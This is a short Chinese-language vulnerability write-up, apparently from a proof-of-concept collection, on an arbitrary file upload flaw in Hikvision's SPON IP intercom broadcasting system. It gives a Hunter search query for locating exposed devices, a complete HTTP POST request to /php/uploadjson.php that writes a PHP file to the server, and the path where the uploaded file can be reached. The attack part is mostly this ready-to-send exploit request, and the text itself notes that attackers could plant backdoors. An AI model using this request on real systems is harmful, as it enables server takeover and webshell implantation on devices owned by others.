# 海康威视SPON IP网络对讲广播系统uploadjson存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传漏洞，恶意攻击者可能会上传恶意的后门文件，使服务器失陷。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/09hL4VLsS-pV3aEb/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-455066.png)

# 四、漏洞复现
```java
POST /php/uploadjson.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

jsondata[filename]=111.php&jsondata[data]=<?php phpinfo();?>
```

![1704870723907-3a79bc40-1174-49ae-86cc-f54a7fc7d35a.png](./img/09hL4VLsS-pV3aEb/1704870723907-3a79bc40-1174-49ae-86cc-f54a7fc7d35a-772590.png)

上传文件位置

```java
/lan/111.php
```

![1704870773380-20e41fa5-0e94-4700-a7e1-9e7a2cbca2e3.png](./img/09hL4VLsS-pV3aEb/1704870773380-20e41fa5-0e94-4700-a7e1-9e7a2cbca2e3-143365.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/riyq6veg7akk2qpx>